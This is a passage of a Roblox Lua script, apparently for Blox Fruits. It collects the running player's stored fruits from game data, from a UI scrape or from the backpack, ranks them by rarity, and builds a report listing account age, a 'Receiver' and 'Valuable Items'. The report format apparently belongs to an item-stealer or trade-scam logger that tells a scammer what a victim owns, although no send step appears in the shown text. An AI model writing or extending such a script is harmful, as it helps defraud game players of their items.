-- 4. Helper: Get Stored Fruits (From ReplicatedStorage & UI Fallback)
local function getStoredFruits()
    local fruits = {}
    local seen = {}
    
    -- Attempt 1: Check ReplicatedStorage for Inventory Data
    local replicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Common locations in BF: ReplicatedStorage/Inventory, ReplicatedStorage/PlayerData, or directly in ReplicatedStorage
    local inventoryFolder = replicatedStorage:FindFirstChild("Inventory")
    local playerData = replicatedStorage:FindFirstChild("PlayerData")
    
    -- Check Inventory Folder
    if inventoryFolder then
        for _, item in pairs(inventoryFolder:GetChildren()) do
            if not seen[item.Name] then
                seen[item.Name] = true
                local qty = 1
                if item:IsA("ValueBase") then
                    qty = item.Value
                elseif item:GetAttribute("Quantity") then
                    qty = item:GetAttribute("Quantity")
                end
                table.insert(fruits, {
                    name = item.Name,
                    rarity = getRarity(item.Name),
                    quantity = qty
                })
            end
        end
    end
    
    -- Check PlayerData (Sometimes stores fruits as attributes or children)
    if playerData and #fruits == 0 then
        -- Some versions store data in attributes
        local fruitsAttr = playerData:GetAttribute("Fruits")
        if type(fruitsAttr) == "table" then
            for fruitName, qty in pairs(fruitsAttr) do
                if not seen[fruitName] then
                    seen[fruitName] = true
                    table.insert(fruits, {
                        name = fruitName,
                        rarity = getRarity(fruitName),
                        quantity = qty
                    })
                end
            end
        end
    end
    
    -- Attempt 2: UI Scraping Fallback (If Data Model is empty)
    if #fruits == 0 then
        print("[BF Script] Data model empty. Attempting UI scrape...")
        local playerGui = PLAYER:FindFirstChild("PlayerGui")
        if playerGui then
            -- Find the Inventory GUI (Name varies, usually "Inventory" or "UI")
            local inventoryGui = nil
            for _, gui in pairs(playerGui:GetChildren()) do
                if gui:IsA("ScreenGui") then
                    -- Look for a Frame named "Inventory" or similar
                    for _, frame in pairs(gui:GetDescendants()) do
                        if frame:IsA("Frame") and (frame.Name:lower():find("inventory") or frame.Name:lower():find("item")) then
                            inventoryGui = frame
                            break
                        end
                    end
                    if inventoryGui then break end
                end
            end
            
            if inventoryGui then
                -- Scrape TextLabels
                for _, label in pairs(inventoryGui:GetDescendants()) do
                    if label:IsA("TextLabel") and label.Text and label.Text ~= "" then
                        -- Filter out UI text like "Inventory", "Close", etc.
                        if not label.Text:lower():find("inventory") and not label.Text:lower():find("close") and not label.Text:lower():find("sell") and not label.Text:lower():find("buy") then
                            if not seen[label.Text] then
                                seen[label.Text] = true
                                table.insert(fruits, {
                                    name = label.Text,
                                    rarity = getRarity(label.Text),
                                    quantity = 1 -- UI scraping rarely gives quantity without deeper parsing
                                })
                            end
                        end
                    end
                end
            end
        end
    end
    
    -- Attempt 3: Backpack Fallback (Last Resort)
    if #fruits == 0 and PLAYER.Backpack then
        for _, tool in pairs(PLAYER.Backpack:GetChildren()) do
            if tool:IsA("Tool") and not seen[tool.Name] then
                seen[tool.Name] = true
                table.insert(fruits, {
                    name = tool.Name,
                    rarity = getRarity(tool.Name),
                    quantity = 1
                })
            end
        end
    end
    
    -- Sort: Mythical > Legendary > Rare > Uncommon > Common > Unknown
    local rarityOrder = {
        ["Mythical"] = 1,
        ["Legendary"] = 2,
        ["Rare"] = 3,
        ["Uncommon"] = 4,
        ["Common"] = 5,
        ["Unknown"] = 6
    }
    
    table.sort(fruits, function(a, b)
        local orderA = rarityOrder[a.rarity] or 7
        local orderB = rarityOrder[b.rarity] or 7
        if orderA ~= orderB then
            return orderA < orderB
        end
        return a.name < b.name
    end)
    
    return fruits
end

-- 5. Build Message Content
local function buildContent()
    local accountAge = getAccountAge()
    local seaLevel = getSeaLevel()
    local fruits = getStoredFruits()
    
    local lines = {}
    
    -- Header
    table.insert(lines, "👤 Display Name : " .. PLAYER_NAME)
    table.insert(lines, "🆔 Username     : " .. PLAYER_NAME)
    table.insert(lines, "📅 Account Age  : " .. accountAge)
    table.insert(lines, "🌊 Sea          : " .. seaLevel)
    table.insert(lines, "😎 Receiver     : host-" .. PLAYER_NAME)
    table.insert(lines, "")
    table.insert(lines, "💰 Valuable Items")
    
    -- Fruits
    if #fruits > 0 then
        for _, fruit in ipairs(fruits) do
            table.insert(lines, "🍎 [" .. fruit.rarity .. "] " .. fruit.name .. " - " .. fruit.quantity .. "x")
        end
    else
        table.insert(lines, "🍎 No fruits found.")
    end
    
    return table.concat(lines, "\n")
end

